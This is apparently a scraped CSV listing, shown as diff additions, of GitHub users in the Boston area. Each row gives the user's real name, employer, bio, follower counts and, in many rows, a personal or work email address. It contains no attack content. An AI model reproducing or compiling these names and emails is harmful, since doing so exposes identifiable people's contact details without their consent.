+sholladay,Seth Holladay,NOIRDOOR,"Boston, MA",me@seth-holladay.com,True,"A human seeking a full stack of pancakes and software, bug free.",99,246,17,2013-02-23T01:39:47Z
+thePunderWoman,Jessica Janiuk,GOOGLE,"Boston, MA, USA",,False,"Software engineer, droid builder, photographer, and maker in the Boston Area. Come for the code, stay for the puns.",20,245,1,2012-04-01T20:54:24Z
+bcarrier,Brian Carrier,SLEUTHKITLABS,"Boston, MA",,False,,9,244,0,2011-06-17T13:26:15Z
+jambonrose,Andrew Pinkham,,"Boston, MA",,False,Author of Python Web Development and Django Unleashed. Dartmouth alum. he/him,36,242,44,2012-10-26T18:33:24Z
+mautic,Mautic,,"Boston, MA",info@mautic.org,False,Free and Open Source Marketing Automation,125,242,0,2013-08-19T00:34:49Z
+mikemahoney218,Michael Mahoney,CAFRI-LABS,"Boston, MA",mike.mahoney.218@gmail.com,True,"R, Python, and using data to understand this complex world we live in",87,242,56,2018-04-09T21:18:36Z
+greyson-signal,Greyson Parrelli,SIGNAL MESSENGER,"Boston, MA",,False,,5,242,0,2018-03-12T20:53:15Z
+pdurbin,Philip Durbin,IQSS,Boston,philipdurbin@gmail.com,False,I work at @IQSS on Dataverse.,182,239,152,2008-08-18T12:58:23Z
+mdshw5,Matt Shirley,NOVARTIS,"Boston, MA",mdshw5@gmail.com,False,"Data Scientist @Novartis, 
+CSO Sturge-Weber Foundation.
+
+Oncology and Rare Disease Research
+
+matt_d.shirley@novartis.com",68,239,254,2011-05-30T22:38:58Z
+JHDevOps,John Hancock - DevOps GIT HUB,,Boston,,False,US Segment Source Code Repository. Access to this organization provides access to all internal repositories in this organization.,0,238,0,2016-12-19T15:49:29Z
+mattfeltonma,Matt Felton,MICROSOFT,"Boston, MA",,False,Just a geek on a journey through this wacky thing we call life.,49,237,18,2018-06-25T10:12:55Z
+jaebradley,Jae Bradley,,Boston,jae.b.bradley@gmail.com,False,Let's build things together 🚀,157,235,125,2014-07-11T14:23:04Z
+SpencerCDixon,Spencer Dixon,TUPLEAPP,"Boston, MA",spencer@tuple.app,False,Cofounder and CEO of Tuple - https://tuple.app,190,234,175,2014-05-02T23:21:00Z
+nomadtechie,Amal Hussein,,"Boston, MA",,False,,8,234,21,2014-02-18T16:18:05Z
+mpetroff,Matthew Petroff,,Boston,,False,,39,231,1,2012-02-18T23:54:19Z
+cykod,Pascal Rettig,CTO AT ALIGNABLE,"Boston, MA",,False,,115,230,20,2009-09-23T21:47:52Z
+colevandersWands,Evan Cole,DENEPO,"Boston, Mass",,False,What if best practice was common practice?,387,230,11,2016-04-19T14:14:59Z
+nirvdrum,Kevin Menard,SHOPIFY,"Boston, MA",,False,,182,230,14,2008-06-04T15:40:29Z
+fangq,Qianqian Fang,NORTHEASTERN UNIVERSITY,"Boston, MA",fangqq@gmail.com,False,"A scientific programmer, technical writer, teacher and get-your-hands-dirty kind of engineer.  Eager to create, eager to share!",91,227,15,2010-03-20T19:05:34Z
+dbrant,Dmitry Brant,"WIKIMEDIA, @DEFIANTTECHNOLOGIES","Boston, MA",me@dmitrybrant.com,True,Lead engineer / Product owner (Android) at @wikimedia. Data recovery / forensics specialist; also the DiskDigger guy.,110,227,16,2012-04-26T14:46:47Z
+stites,Sam Stites,NUPRL,"Boston, MA",,False,,214,226,215,2012-05-01T06:11:04Z
+atticoos,Atticus White,RALLYSPACE,"Boston, MA",,True,"Creating @rallyspace.
+Created @robinpowered",216,225,122,2011-03-07T23:50:14Z
+tel,Joseph Abrahamson,,"Boston, MA, USA",me@jspha.com,True,,198,225,143,2008-02-27T18:33:51Z
+timeyoutakeit,Amy Burns,GITHUB,"Boston, MA",,False,,36,223,3,2013-07-15T11:53:58Z
+hyperobject,cori hyperobject,DAPPLE-SECURITY,"boston, ma",,False,"writing secure software @Dapple-Security.  formerly @scratchfoundation, @zoom, @keybase, @LeftHandRobotics",94,223,33,2012-12-11T19:44:07Z
+PharkMillups,Mark Phillips,HELIUM,Boston / San Francisco,msphillenator@gmail.com,False,,23,222,0,2010-01-06T15:17:28Z
+zheyuanzhou,Bruce Ted,,BOSTON,,True,"JS Teacher Assistant.
+Spending on C# used in Unity Engine, Java for processing, JavaScript libraries such as p5, SVG, Three, D3 etc",25,222,16,2018-01-22T19:29:02Z
+mxie,Melissa Xie,GITHUB,"Boston, MA",,False,"@bridgefoundry Board Member, @railsbridge Board Member, @railsbridge-boston Chapter Lead, and a bunch of other things.",54,221,21,2011-02-05T21:42:19Z
+natesales,Nate Sales,TINFOIL.SH,"Boston, MA",nate@natesales.net,True,Infrastructure + Security + Applied Physics,83,221,34,2016-07-11T04:34:38Z
+benborgers,Ben Borgers,,"Boston, MA",borgersbenjamin@gmail.com,False,,41,221,2,2017-07-16T16:05:57Z
+talbs,Brian Talbot,FORTAWESOME,"Boston, MA",hi.talbs@gmail.com,False,,10,220,154,2009-12-07T14:14:54Z
+npinto,Nicolas Pinto,MIT,"Boston, MA",,False,,156,219,45,2008-12-18T04:54:08Z
+dongilbert,Don Gilbert,ACQUIA,"Boston, MA",don@dongilbert.net,False,Software engineer @acquia,68,219,12,2011-04-08T18:16:17Z
+cdimascio,Carmine DiMascio,AMAZON,"Boston, MA",carmine.dimascio@pillpack.com,False,"engineer ⋅ musician ⋅ always learning ⋅ @amzn, formerly @tripadvisor, @IBM
+",117,219,39,2013-06-15T18:46:01Z
+kevincennis,Kevin Ennis,STARRY,Boston,kennis84@gmail.com,True,VP of Engineering @StarryInternet. JavaScript enthusiast.,22,219,23,2011-06-22T22:09:39Z
+kmax12,Max Kanter,,"Boston, MA",kmax12@gmail.com,False,I like building things,24,219,9,2010-08-21T14:38:50Z
+Amoursol,Sol Amour,AUTODESK,Boston,,False,"Architectural explorer, digital warrior, affectual adventurer and curious human being.",26,217,9,2015-06-12T07:55:05Z
+evan,Evan Weaver,,Boston,,False,Engineer/Founder/Investor,40,216,7,2008-02-13T07:14:02Z
+davidprowe,David Rowe,AWS,"Boston, MA",,False,SR Solutions Architect,19,216,5,2013-06-12T15:45:11Z
+kaz-yos,Kazuki Yoshida,,"Boston, MA, USA",kazukiyoshida@mail.harvard.edu,True,Father in Training | Rheumatology & Drug Safety/Efficacy & Clinical Research,97,216,286,2012-11-25T15:09:36Z
+kenfinnigan,Ken Finnigan,,"Boston, MA",ken@kenfinnigan.me,False,"Open source engineer, observability, @open-telemetry, author, amateur genealogist. Former @ Red Hat.",55,214,82,2010-10-15T20:44:54Z
+snyk-labs,Snyk Labs,,Boston/London/Israel,,False,"Continuously find & fix vulnerabilities in dependencies pulled from npm, Maven, RubyGems, PyPI and more",112,213,0,2019-02-19T19:07:16Z
+elibarzilay,Eli Barzilay,PLT SCHEME,"Boston, MA",eli@barzilay.org,False,"Hacker, Racketeer.
+",25,213,0,2010-01-20T02:23:42Z
+IceCreamYou,Isaac Sukin,,Boston Area,,False,Mostly codes web front-end and graphics stuff.,39,213,7,2010-02-13T20:12:12Z
+msbarry,Michael Barry,,MetroWest Boston,,False,Software engineer,91,212,33,2012-02-28T02:22:31Z
+danginsburg,Dan Ginsburg,"UPSAMPLE SOFTWARE, LLC","Boston, MA",,False,,19,211,3,2010-08-25T13:22:35Z
+johnny-rice,Johnny Rice,TECH ADVISOR AND MENTOR,"Boston, Massachusetts",jrice@labact.com,True,"Over 20 years of software dev, startup experience, instruction, mentoring, project, and people management.",1007,210,592,2011-04-09T04:04:28Z
+mbernste,Matthew Bernstein,STELLAROMICS,"Boston, MA",,False,Staff Scientist at Stellaromics,41,210,18,2013-07-13T21:18:38Z
+nhejazi,nima hejazi,HARVARD CHAN SCHOOL OF PUBLIC HEALTH,"Boston, Massachusetts",nh@nimahejazi.org,False,assistant professor of biostatistics at the harvard chan school of public health,73,209,198,2014-08-22T22:01:52Z
+lyoshenka,grin,"CABINDAO, @LBRYIO, @TOPSCORE","Boston, MA",,False,,218,209,62,2010-08-12T22:15:10Z
+agrosner,Andrew Grosner,WAYFAIR,"Boston, MA",abgrosner@gmail.com,False,Senior Staff Engineer - Android @wayfair,39,208,19,2012-08-08T16:18:52Z
+DZuz14,Daniel Zuzevich,,Boston Massachusetts,,True,,0,205,85,2016-05-20T14:23:05Z
+deciduously,Ben Lovy,TANGRAMDOTDEV,"Boston, MA",ben@deciduously.com,False,,148,199,578,2015-06-28T16:57:24Z
+natea,Nate Aune,JAZKARTA,"Boston, MA",,False,"AI engineer, musician and entrepreneur. Founder of @appsembler and @jazkarta ",117,199,473,2009-08-24T18:25:38Z
+endless-sky,Endless Sky,,Boston,,False,,13,198,0,2015-03-13T01:15:26Z
+arjunguha,Arjun Guha,NUPRL,"Boston, MA",,False,hacker / cs professor,24,197,14,2008-08-08T19:49:13Z
+Richarizardd,Richard Chen,,"Boston, Massachusetts",richardchen@g.harvard.edu,False,"AI for Pathology @ Harvard Medical School, Brigham and Women's Hospital",6,197,26,2014-12-26T04:21:28Z
+rmeschian,Rouben Meschian,,"Boston, MA",,True,,22,196,0,2012-06-16T18:54:14Z
+lizbur10,Liz Burton,FLATIRON SCHOOL,"Boston, MA",,False,"Curriculum Developer Lead at Flatiron School. Full-stack Web Developer: JavaScript, React, Redux, Ruby, Rails, HTML/CSS
+",848,194,1,2014-11-11T00:53:25Z
+kriegsman,Mark Kriegsman,,Boston,,False,Lightbreaker.,3,194,15,2012-01-16T19:08:56Z
+alec-chernicki,Alec Chernicki,DISNEY,"Boston, Massachusetts ",aleccortega@gmail.com,False,"Architect at @disneystreaming. Previously @ezcater, @HubSpot, @wespire.
+
+Building @commonalityco ",30,193,0,2014-02-05T16:42:19Z
+jebyrnes,Jarrett Byrnes,UMASS BOSTON,"Boston, MA",,False,,97,192,95,2011-04-28T17:41:16Z
+cmatskas,Christos Matskas,AMAZON,"Boston, MA",christos.matskas@gmail.com,False,,159,192,4,2013-04-11T13:51:33Z
+captain-pool,Adrish Dey,BOSTON UNIVERSITY,"Boston, MA",adrishd@bu.edu,True,CS PhD @ Boston University,72,191,10,2015-08-27T06:58:09Z
+freddiev4,Freddie Vargus,QUOTIENT AI,"Boston, MA",,False,co-founder & cto @quotient-ai ,36,191,28,2014-08-02T18:17:40Z
+jaredwilli,Jared Williams,CARGURUS,Boston,jaredwilli@gmail.com,True,Senior UI Engineer at CarGurus,322,190,119,2010-03-08T14:17:22Z
+archd3sai,Arch Desai,,"Boston, MA",archdesai.ad@gmail.com,True,Staff Data Scientist,28,190,43,2018-11-13T18:36:19Z
+jimkang,Jim Kang,,Boston,,True,Corporate credentials,555,190,128,2010-07-06T14:12:20Z
+lucapinello,Luca Pinello,MASSACHUSETTS GENERAL HOSPITAL/ HARVARD MEDICAL SCHOOL,Boston,,True,"I am hiring, shoot me a message! Associate Professor at MGH/Harvard Bioinformatics, Machine Learning, Functional Genomics, CRISPR/Cas9, Single-Cell Omics ",44,189,110,2011-09-26T16:58:23Z
+buildwithmalik,Abdul Malik,BUILDWITHMALIK@GMAIL.COM,"Boston, US",,False,SDE @ Amazon (AWS) | GSoC '22 @CCExtractor | Love to convert thoughts into code |,40,189,78,2019-02-02T14:48:02Z
+fawce,fawce,,"Boston, MA",,False,,3,188,8,2011-04-16T14:58:26Z
+chiroptical,Barry Moore,HTTPS://MERCURY.COM,Boston,,False,Random functional programming content on https://youtube.com/chiroptical.,135,187,75,2012-12-20T03:24:03Z
+notnoop,Mahmood Ali,,"Boston, MA",,False,,62,187,3,2009-10-07T17:30:41Z
+robm26,Rob McCauley,AWS,"Boston, MA",,False,"Solutions Architect for AWS, specializing in DynamoDB.
+",18,186,6,2013-01-04T19:13:36Z
+LeifAndersen,Leif Andersen,PLT @ NORTHEASTERN UNIVERSITY,"Boston, MA",,False,,244,186,50,2010-05-24T19:05:32Z
+benley,Benjamin Staffin,,"Boston, MA",benley@gmail.com,False,,157,186,94,2012-02-13T09:04:39Z
+hms-dbmi,Harvard Medical School - Department of Biomedical Informatics,,Boston,,False,,371,186,0,2013-11-14T14:50:46Z
+toddparker,Todd Parker,FILAMENT GROUP INC.,Boston MA,todd@filamentgroup.com,False,,2,185,9,2010-08-10T15:39:47Z
+minzwon,Minz Won,SUNO,"Boston, MA",minz@suno.com,False,Exploring music semantics with machines,17,184,1,2015-09-09T16:02:22Z
+astuyve,AJ Stuyvenberg,DATADOG,Boston,astuyve@gmail.com,True,"Engineering @datadog, working on Serverless.
+AWS Serverless Hero.
+AKA Aaron Stuyvenberg. Previously @serverless",54,181,11,2012-04-02T14:42:24Z
+haehn,Daniel Haehn,UNIVERSITY OF MASSACHUSETTS BOSTON,"Boston, MA",haehn@seas.harvard.edu,False,biomedical imaging + visualization researcher.  #webgl #boxing and my sons. support #CSforAll !,164,180,29,2009-03-18T19:10:34Z
+ericminikel,Eric Minikel,PRION ALLIANCE,"Boston, MA",,False,My mission in life is to prevent prion disease.,62,180,10,2012-06-21T22:07:48Z
+connorgr,Connor Gramazio,PILLPACK,"Boston, Massachusetts",,False,Brown computer science PhD'17. Tufts BS'12. ML + DataVis + HCI,32,180,3,2012-01-30T19:14:19Z
+MSylvia,Matt Sylvia,,"Boston, MA",msylvia@nukefile.net,False,//TODO: Add bio,993,180,677,2011-02-18T02:34:03Z
+mwand,Mitchell Wand,NORTHEASTERN UNIVERSITY,"Boston, MA",wand@ccs.neu.edu,False,,28,180,0,2012-09-13T12:27:22Z
+AlJohri,Al Johri,AMAZON,"Boston, MA",al.johri@gmail.com,False,,145,179,323,2012-11-13T20:35:01Z
+yukyunglee,Yukyung Lee,,Boston,,False,"Postdoc @ Boston University | Prev: KoreaUniv, NAVER | Interests: Agent,  Evaluation, Writing with AI, Conversational AI, Anomaly Detection",30,179,104,2018-01-24T02:17:28Z
+dylanebert,Dylan Ebert,HUGGING FACE,"Boston, MA",,False,"Developer Advocate, IndividualKex on TikTok/YT",39,177,0,2014-09-22T20:31:33Z
+nixpulvis,Nathan Lilienthal,,Boston,nathan@nixpulvis.com,False,,104,177,66,2011-04-07T18:48:04Z
+ethanmick,Ethan Mick,"ETHAN MICK, LLC",Boston,ethan@ethanmick.com,False,"Founder of Ethan Mick, LLC.",141,176,12,2009-12-12T22:22:42Z
+dgasmith,Daniel Smith,STEALTH NEWCO,"Boston, MA",dgasmith@icloud.com,False,Twitter: @dga_smith,66,176,0,2012-05-23T12:55:44Z
+lambdageek,Aleksey Kliger (λgeek),MICROSOFT,"Boston, MA",,False,I believe that programmers are most efficient in languages with expressive type systems that can directly encode program invariants.,142,176,31,2010-11-13T20:43:32Z
+rshriram,Shriram Rajagopalan,GOOGLE,Boston,,False,,46,175,0,2014-07-18T16:16:31Z
+fedorov,Andrey Fedorov,BRIGHAM AND WOMEN'S HOSPITAL,"Boston, MA",fedorov@bwh.harvard.edu,False,,180,175,7,2010-06-24T19:39:27Z
+jonasrosland,Jonas Rosland,VAST DATA,"Boston, MA, USA",jonas.rosland@gmail.com,False,Director of Community at VAST Data,158,175,19,2012-04-29T15:22:44Z
+leoleoasd,Yuxuan Lu,NORTHEASTERN,Boston,i@yuxuan.lu,False,"Hi 👋🏻 I'm Yuxuan (Leo) Lu, a Ph.D. Student at Northeastern University. Previously @linkedin @microsoft
+",145,175,177,2018-03-24T10:30:06Z
+colbyr,Colby Rabideau,METAPLANE,"Boston, MA",,False,,68,173,13,2010-11-11T23:52:25Z
+neogeek,Scott Doxey,,"Boston, MA",hello@scottdoxey.com,True,Web / Unity Developer,157,172,78,2008-04-11T19:30:13Z
+rdwrome,r. d. w. rome,BERKLEE,boston,,False,sonic artist,22,172,63,2017-06-28T19:39:34Z
+Daenyth,Alanna Stone,47DEG,"Boston, MA, USA",Daenyth+github@gmail.com,False,,87,171,25,2008-06-23T02:06:22Z
+dbuytaert,Dries Buytaert,,Boston,,False,"Founder and Project Lead of Drupal
+Co-founder and CTO of Acquia",1,171,0,2011-11-15T20:30:54Z
+eagleoflqj,Qijia Liu,BOSTON UNIVERSITY,Boston,,False,Free and Open Source for general public,77,171,27,2017-03-30T03:33:21Z
+david-m-rosen,David M. Rosen,NORTHEASTERN UNIVERSITY,"Boston, MA",d.rosen@northeastern.edu,False,,16,170,57,2016-08-08T20:28:03Z
+asfalcone,Andrea Falcone,GOOGLE,"Boston, MA",,False,,11,169,0,2012-06-14T02:18:49Z
+DevashishPrasad,Devashish Prasad,NABLA BIO,"Boston, MA",devashishkprasad@gmail.com,True,Machine Learning and Research. ,24,169,35,2018-03-17T13:57:03Z
+aabmass,Aaron Abbott,GOOGLE,"Boston, MA",,False,,96,169,4,2012-03-07T04:30:10Z
+theonewolf,Wolfgang Richter,SOROCO,"Boston, MA",wolfgang.richter@gmail.com,False,"Distributed systems research, cloud computing, and using them to create new, valuable solutions.",57,168,18,2010-12-14T06:07:12Z
+bwallace,byron wallace,,"Boston, MA",byron@ccs.neu.edu,False,"associate prof., CCIS @ Northeastern",54,168,14,2009-03-13T14:01:09Z
+bellesea,Belle See,WELLESLEY COLLEGE,"Boston, MA",,True,"making things with code, fabric, wood, and more 💖",82,168,92,2020-05-23T09:08:42Z
+wwylele,Weiyi Wang,,"Boston, MA",wwylele@gmail.com,False,,53,167,23,2013-06-02T12:00:06Z
+mychele,Michele Polese,NORTHEASTERN UNIVERSITY,Boston,michele.polese@gmail.com,False,,28,166,154,2014-04-04T13:41:03Z
+jasisk,Jean-Charles Sisk,,"Boston, MA",,False,"@sesamecare, ex @Netflix @gas-buddy @paypal @where
+
+",136,166,0,2009-03-12T22:12:53Z
+jeffreybreen,Jeffrey Breen,,"Boston, MA",,False,,28,165,7,2009-06-01T02:22:23Z
+anandijain,anand jain,,"San Jose CA, Boston MA",,False,"cs
+music
+p=np",219,165,1805,2017-11-18T18:48:25Z
+brandly,Matt Brandly,SONOS-INC,"Boston, MA",,False,"web experiments, reliable software",174,161,299,2011-05-31T13:20:13Z
+IanTheEngineer,Ian McMahon,TOYOTARESEARCHINSTITUTE,"Boston, MA",ian@ianthe.engineer,False,"Roboticist, Tinkerer, &
+Open Source Advocate
+",47,161,51,2011-06-15T03:11:29Z
+dbhurley,DBH,,"Boston, MA",,False,,144,161,1,2013-08-17T16:28:37Z
+Aveek-Saha,Aveek Saha,AKAMAI,"Boston, MA",aveek.s98@gmail.com,True,"Cloud Computing, Distributed Systems and Full Stack. Currently SDE 2 @akamai. Previously at @HewlettPackard, @altimetrik & @ IIT Kgp. 
+MSCS from @northeastern.",66,161,33,2017-09-09T14:41:01Z
+atenpas,Andreas ten Pas,NORTHEASTERN UNIVERSITY,Boston,,False,"PhD graduate in Computer Science from Northeastern University (USA)
+
+M.Sc. and B.Sc. from Maastricht University (NL).
+",14,161,11,2013-10-15T16:21:55Z
+kayserifserif,Katherine Yang,FATHOMINFO,"Boston, USA",,False,softly • previously whykatherine,49,160,123,2013-07-09T06:09:49Z
+tawnthanh,Thanh Nguyen,,"Boston, MA",,False,"Full-Stack Software Engineer | Frontend enthusiast | JS, React.js, Python",7,160,148,2020-07-28T21:33:15Z
+radical,Ankit Jain,MICROSOFT,"Boston, MA",radical@corewars.org,False,,45,160,20,2008-02-28T07:32:28Z
+tfmorris,Tom Morris,,"Boston, USA",,True,,210,159,29,2009-05-07T19:56:50Z
+jlegewie,Joscha Legewie,HARVARD UNIVERSITY,Boston,,False,,45,159,0,2011-12-29T12:56:49Z
+iamgroot42,Anshuman Suri,NORTHEASTERN UNIVERSITY,Boston,,False,"Postdoc, Northeastern University. Interested in ML Privacy & Security.",182,157,89,2014-12-10T11:09:34Z
+ttsou,Tom Tsou,DEEPSIG INC.,Boston,,False,,9,157,0,2009-08-24T19:19:28Z
+lpantano,Lorena Pantano,,Boston,lorena.pantano@gmail.com,True,"PhD in miRNA analysis in mental disease @ CRG, Barcelona, Spain. Experience in NGS data analysis. Love python, R, and data integration. twitter:@lopantano",114,157,47,2012-04-07T19:09:44Z
+ksylor,Katie Sylor-Miller,,Greater Boston,,False,"Principal Engineer @ Square, formerly Etsy. Fairy Gitmother @ ohshitgit.com",11,156,1,2012-05-02T12:15:39Z
+klaviyo,Klaviyo,,"Boston, MA",,False,,86,156,0,2012-07-10T04:38:15Z
+rchillyard,Robin Hillyard,NORTHEASTERN UNIVERSITY,"Boston, MA",scalaprof@gmail.com,True,"Scala, Spark and Java developer and teacher (Northeastern University). Open source developer of many Scala libraries.",56,156,6,2013-04-18T15:05:53Z
+pedropassos06,Pedro Passos,,Boston,pedropassos.yt@gmail.com,False,Developer @ BHSI,9,155,1,2020-04-22T04:51:52Z
+tjade273,Tjaden Hess,TRAIL OF BITS,"Boston, MA",tjade273@gmail.com,True,"Cryptography Auditing @ Trail of Bits
+",91,155,5,2013-03-22T01:04:30Z
+timcappalli,Tim Cappalli,OKTA,"Boston, MA",tim@cloudauth.dev,False,"passkeys, FIDO2/WebAuthn, and digital credentials @ okta ",25,155,109,2014-01-22T23:40:04Z
+hgorr,"Heather Gorr, PhD",MATHWORKS,"Boston, MA USA",,False,"Data scientist, machine learning/ deep learning enthusiast, MATLAB fangirl. Instagram/ TikTok: @heather.codes",23,154,1,2015-11-29T21:00:01Z
+rachelkang,Rachel Kang,MICROSOFT,"Boston, MA",,False,Product Manager @ .NET MAUI,23,153,16,2016-09-04T17:04:07Z
+maxdemaio,Maxwell DeMaio,,"Boston, MA",,False,,102,153,187,2018-10-22T15:44:16Z
+ngehlenborg,Nils Gehlenborg,HARVARD MEDICAL SCHOOL,"Boston, MA",nils@hms.harvard.edu,False,Faculty @hms-dbmi. Data Visualization. Biomedical Informatics. Genomics. Epigenomics. Cancer Biology. Single-Cell X. EHR UI. mHealth Data.,29,152,17,2011-11-23T20:13:53Z
+immunogenomics,Raychaudhuri Lab,,"Boston, MA, USA",raychaudhuri.lab@gmail.com,False,,68,152,0,2015-08-21T16:38:58Z
+Vic0428,Weiqi Feng,HARVARD UNIVERSITY,Boston,wfeng@g.harvard.edu,False,MLSys Research Engineer Intern @ Bytedance | Graduate Research Assistant @ Harvard,66,152,179,2017-10-15T01:49:57Z
+danieloh30,Daniel Oh,RED HAT,"Boston, MA",doh@redhat.com,False,"Java Champion, CNCF Ambassador, Developer Advocate, Technical Marketing,  International Speaker, Published Author @quarkusio @redhat",276,152,0,2015-09-01T04:23:07Z
+TerribleDev,Tommy Parnell,DISTILLCLOUD,Boston Area,tommy@terribledev.io,False,Linux | javascript | functional,286,152,37,2013-02-02T22:51:20Z
+ewadkins,Eric Wadkins,"GOOGLE, MIT MEDIA LAB","Boston, Massachusetts",ewadkins@alum.mit.edu,True,I'm a graduate of MIT's Class of 2018 and current M.Eng. student in AI at the MIT Media Lab.,43,152,5,2014-08-04T23:14:55Z
+berquist,Eric Berquist,SANDIA NATIONAL LABORATORIES,"Boston, MA",,False,full-stack quantum chemist,362,151,75,2011-04-13T18:01:12Z
+securingdev,Keith Hoodlet,TRAILOFBITS,Greater Boston Area,,False,Writer; Thought Developer; Vulnerability Whisperer; Code curious.,66,150,14,2016-10-12T23:03:31Z
+rwest,Richard West,NORTHEASTERN UNIVERSITY,"Boston, MA",r.west@northeastern.edu,False,"Associate Professor of Chemical Engineering at Northeastern University, head of @CoMoChEng research group, and a developer of @ReactionMechanismGenerator.",79,150,82,2009-06-10T00:49:28Z
+johndatserakis,John Datserakis,MAILGUN,"Boston, MA",,False,Senior Software Engineer at @mailgun.,26,150,64,2014-11-27T06:19:12Z
+zkytony,Kaiyu Zheng,,"Greater Boston, MA",,False,Roboticist ,72,149,3,2014-05-28T03:54:52Z
+mgoin,Michael Goin,REDHATOFFICIAL @NEURALMAGIC,Boston,mgoin@redhat.com,True,"LLM inference optimization
+@vllm-project | @redhat | @neuralmagic",64,149,57,2013-01-05T22:07:32Z
+ehebert,Eddie Hebert,KLAVIYO,"Boston, MA",eddie@eddiehebert.com,False,,19,148,23,2010-01-19T21:50:51Z
+astorije,Jérémie Astori,"DATADOG, EX-@ANALOGDEVICESINC, EX-@CLOUDHEALTH BY @VMWARE, EX-@W3C","Boston, MA, USA",,False,,173,148,3,2009-08-10T11:35:46Z
+kocolosk,Adam Kocoloski,AIRBNB,"Boston, MA",adam@kocolosk.net,False,Engineering @airbnb. Previously @IBM by way of @Cloudant.,33,148,0,2008-07-10T16:13:07Z
+clintval,Clint Valentine,FULCRUMGENOMICS,Seattle or Boston,valentine.clint@gmail.com,False,"Interested in the molecular patterns of carcinogenesis, rock climbing, computational biology, and hand-rolled pasta.",30,148,426,2013-06-06T21:53:04Z
+aceyoung9,Ace Young,,"Boston, MA",,True,"CSS detangler, JavaScript wrangler",40,148,88,2012-10-03T22:09:26Z
+GleasonK,Kevin Gleason,GOOGLE,"Boston, MA",kaagleason@gmail.com,True,"Google, StableHLO TL",63,148,14,2012-12-13T20:24:05Z
+makslevental,Maksim Levental,AMD,"Boston, Massachusetts",maksim.levental@gmail.com,True,"DSLs, compilers, accelerator architectures, and math.",68,147,42,2013-10-10T16:49:20Z
+cscott,C. Scott Ananian,WIKIMEDIA FOUNDATION,"Boston, MA",cscott@cscott.net,False,See https://en.wikipedia.org/wiki/User:cscott,260,147,3,2009-11-20T19:00:14Z
+mlevans,Michael Lawrence Evans,"OFFICE OF EMERGING TECHNOLOGY, CITY OF BOSTON","Boston, MA",,False,,18,147,33,2010-09-03T07:43:57Z
+lisawilliams,Lisa Williams,,"Boston, MA",lisatmh@gmail.com,True,,126,146,84,2011-05-25T03:42:36Z
+harryzhangOG,Harry Zhang,MIT,"Boston, MA",,False,PhD candidate at MIT LIDS,27,146,2,2018-09-30T21:52:49Z
+Krastanov,Stefan Krastanov,UMASS AMHERST,Boston,github.acc@krastanov.org,False,,63,146,0,2011-04-02T10:54:28Z
+darencard,Daren Card,BROAD INSTITUTE OF MIT AND HARVARD / DANA-FARBER CANCER INSTITUTE,"Boston, MA",,False,,61,146,7,2014-07-25T03:40:08Z
+bsimpson63,Brian Simpson,,"Boston, MA",,False,,19,146,0,2011-06-06T18:12:52Z
+seflless,Francois Laberge,,"Boston, MA",francoislaberge@gmail.com,True,I build creative developer tools. ,100,145,21,2008-03-01T00:10:56Z
+justinblaber,Justin,,Greater Boston,,False,Computer Vision Engineer,33,145,18,2014-04-23T02:11:06Z
+Foundation-Devices,Foundation Devices,,"Boston, MA, USA",hello@foundationdevices.com,False,Building the open hardware foundation for  Bitcoin and the sovereign Internet.,54,145,0,2020-07-13T19:49:40Z
+ab,Andy Brody,SUBLIME-SECURITY,Boston,,False,"For government account, see @brodygov.",132,144,6,2010-08-01T13:54:41Z
+ecp4224,Eddie Penta,,Boston,ecp4224@gmail.com,False,Fullstack developer who also makes games and developer utilities.,88,143,68,2011-06-27T18:20:05Z
+FedeClaudi,Federico Claudi,MIT,Boston,,False,,73,142,202,2016-02-23T17:59:16Z
+philipturnbull,Phil Turnbull,,"Boston, MA",,False,,22,142,3,2009-01-10T16:34:56Z
+JoelQ,Joël Quenneville,THOUGHTBOT,Boston,,False,,86,142,12,2011-08-26T16:44:34Z
+AIM-Harvard,Artificial Intelligence in Medicine (AIM) Program,,"Boston, Massachussets",,False,GitHub page for the AIM Program.,24,141,0,2020-09-08T09:35:36Z
+elicassion,Jinghuan Shang,THE AI INSTITUTE,Boston,,True,"Research Scientist @bdaiinstitute;
+Robot Learning and Computer Vision; PhD from Stony Brook University",62,141,166,2015-03-18T12:01:50Z
+jtriley,Justin Riley,,"Boston, MA",,False,,73,140,33,2009-01-15T21:34:58Z
+seleniumbase,SeleniumBase,,"Boston, MA",,False,,4,140,0,2016-02-17T06:14:09Z
+ertuil,Elliot Chen,UNIVERSITY OF SCIENCE AND TECHNOLOGY OF CHINA,"Boston, MA",elliot.98@outlook.com,False,"Ph.D. in Cyber Security at USTC, focusing on network security.",51,140,77,2015-09-20T01:58:10Z
+evijit,Avijit Ghosh,HUGGINGFACE,"Boston, Massachusetts ",avijitg22@gmail.com,False,Applied Policy Researcher at Hugging Face 🤗 ,68,139,11,2013-03-13T01:10:45Z
+aaxwaz,WeiminWang,,"Boston, US",,True,,165,138,1,2014-10-08T01:13:16Z
+cfredric,Chris Fredrickson,GOOGLE,"Boston, MA, USA",,False,Working on Google Chrome's Privacy Sandbox.,17,137,8,2013-04-19T18:53:45Z
+trentwiles,Trent Wiles,,Boston/New Haven,,True,How's your OpSec?,200,137,215,2020-01-07T00:22:29Z
+willemneal,Willem Wyndham,,"Boston, MA",,False,"Interested in decentralization and everything Wasm.
+",352,137,82,2012-02-28T21:17:33Z
+Raocp,ChengpingRao,NORTHEASTERN UNIVERSITY,Boston,,False,Python/C++/TensorFlow/PyTorch,20,137,2,2016-12-13T02:19:04Z
+chaarlottte,charlotte,,Boston,,True,Software engineer that enjoys cybersecurity and Artificial Intelligence,45,137,69,2020-09-14T16:36:37Z
+Connor-SM,Connor Milliken,"HUBSPOT, INC.","Boston, MA",,False,"- Author of Python Projects for Beginners
+
+- Python Instructor
+
+- Adventurer/Traveler",51,136,36,2016-08-10T22:39:46Z
+mjmacarty,Matt Macarty,ALPHABENCH,"Boston, MA",matt.macarty@gmail.com,True,,29,136,1,2014-01-23T19:35:53Z
+tristandunn,Tristan Dunn,HUBSPOT,"Boston, MA",hello@tristandunn.com,False,"Remote Technical Lead II at HubSpot, working on Clearbit by HubSpot.",39,136,0,2008-04-25T18:34:47Z
+LanceMcCarthy,Lance McCarthy,TELERIK,Boston,,False,"Microsoft MVP | Manager, Technical Support - Developer Tooling @Progress (@telerik and Kendo UI)
+",175,135,3,2013-02-09T18:42:28Z
+corincerami,Corin Cerami,,"Boston, MA",,False,"queer programmer, former environmental scientist",115,135,17,2014-06-09T13:24:15Z
+Hasaber8,Rohan Hasabe,,"Boston, MA",hasabe.r@northeastern.edu,True,"CS @ Northeastern, Boston |
+I write code sometimes.",22,135,46,2018-09-30T09:16:02Z
